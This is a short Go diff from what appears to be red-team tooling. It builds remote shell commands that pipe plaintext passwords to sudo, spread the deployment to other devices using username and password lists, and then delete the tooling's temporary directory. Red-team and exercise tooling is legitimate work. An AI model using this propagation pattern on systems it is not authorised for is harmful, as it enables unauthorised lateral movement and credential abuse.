@@ -87,8 +87,7 @@ func runRemote(username, password, ip string) {
 		"echo " + password + " | sudo -S ./install-all.sh\n"
 	if isTarget {
 		//If this is a target, add commands to deploy to other devices
-		command += "cd deploy\n" +
-			"echo " + password + " | sudo -S go run deploy-master.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list " + strings.Join(passwords, ",") + "\n"
+		command += "echo " + password + " | sudo -S go run deploy-master.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list " + strings.Join(passwords, ",") + "\n"
 	}
 	command += "echo " + password + " | sudo -S rm -rf /tmp/redteam-scripts\n"
 	command += "exit"
